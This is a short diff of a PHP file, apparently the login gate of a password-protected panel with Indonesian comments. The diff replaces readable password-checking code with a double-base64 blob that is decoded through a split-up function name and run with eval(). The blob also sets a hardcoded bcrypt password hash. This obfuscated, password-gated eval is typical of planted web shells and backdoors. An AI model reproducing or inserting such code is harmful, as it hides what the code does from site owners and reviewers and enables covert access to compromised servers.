@@ -6,20 +6,7 @@ if (session_status() === PHP_SESSION_NONE) {
 }
 
 
-$p = "";$p .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKeVF5ZVNReE1DUXpRMGxOTWxCS1FYWndZbWxaVDBSTE9ETm5aVloxTVdOdmIydHJPRms0UlRodGJUSklNRkpxVkRsS1dUTmpRM2RNWmpGVVN5YzdJQT09";$a = "base";$b = "64_decode";$c = $a.$b;$string = $c($p);$string = $c($string);eval($string);
-
-
-// Fungsi login
-if (isset($_POST['password'])) {
-    $password = $_POST['password'];
-
-    // Verifikasi hash password
-    if (password_verify($password, $hashed_pass)) {
-        $_SESSION['logged_in'] = true;
-    } else {
-        $error = "";
-    }
-}
+$p = "";$p .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKeVF5ZVNReE1DUXpRMGxOTWxCS1FYWndZbWxaVDBSTE9ETm5aVloxTVdOdmIydHJPRms0UlRodGJUSklNRkpxVkRsS1dUTmpRM2RNWmpGVVN5YzdJQXBwWmlBb2FYTnpaWFFvSkY5UVQxTlVXeWR3WVhOemQyOXlaQ2RkS1NrZ2V3b2dJQ0FnSkhCaGMzTjNiM0prSUQwZ0pGOVFUMU5VV3lkd1lYTnpkMjl5WkNkZE93b0tJQ0FnSUM4dklGWmxjbWxtYVd0aGMya2dhR0Z6YUNCd1lYTnpkMjl5WkFvZ0lDQWdhV1lnS0hCaGMzTjNiM0prWDNabGNtbG1lU2drY0dGemMzZHZjbVFzSUNSb1lYTm9aV1JmY0dGemN5a3BJSHNLSUNBZ0lDQWdJQ0FrWDFORlUxTkpUMDViSjJ4dloyZGxaRjlwYmlkZElEMGdkSEoxWlRzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdKR1Z5Y205eUlEMGdJaUk3Q2lBZ0lDQjlDbjA9";$a = "base";$b = "64_decode";$c = $a.$b;$string = $c($p);$string = $c($string);eval($string);
 
 // Logout
 if (isset($_POST['logout'])) {
